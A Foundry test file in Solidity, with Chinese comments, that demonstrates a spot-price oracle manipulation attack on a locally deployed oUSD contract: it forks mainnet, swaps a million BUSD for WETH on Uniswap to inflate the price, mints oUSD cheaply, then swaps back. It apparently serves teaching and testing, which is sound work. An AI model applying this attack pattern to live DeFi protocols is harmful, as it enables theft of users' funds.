// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IBUSD is IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    oUSD ousd;

    function setUp() public {
        vm.createSelectFork("mainnet", 16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // 攻击预言机
        // 0. 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore);
        // 给自己账户 1000000 BUSD
        uint256 busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. 用busd买weth，推高顺时价格
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(BUSD, WETH, busdAmount, 1, alice);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter);
        // 4. 铸造oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this)) / 10e18);

        // 5. 卖掉weth
        uint256 wethAmount = weth.balanceOf(alice);
        console.log("WETH balance: ", wethAmount);
        vm.prank(alice);
        weth.transfer(address(this), wethAmount);
        swapBUSDtoWETH(WETH, BUSD, wethAmount, 1, alice);

        uint256 busdAmountAfter = busd.balanceOf(alice);
        console.log("5. Cost busd: ", busdAmount - busdAmountAfter);
    }

    function swapBUSDtoWETH(address _tokenIn, address _tokenOut, uint256 _amountIn, uint256 _amountOutMin, address _to)
        public
        returns (uint256 amountOut)
    {
        IERC20(_tokenIn).approve(address(router), _amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;

        uint256[] memory amounts = router.swapExactTokensForTokens(_amountIn, _amountOutMin, path, _to, block.timestamp);
        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
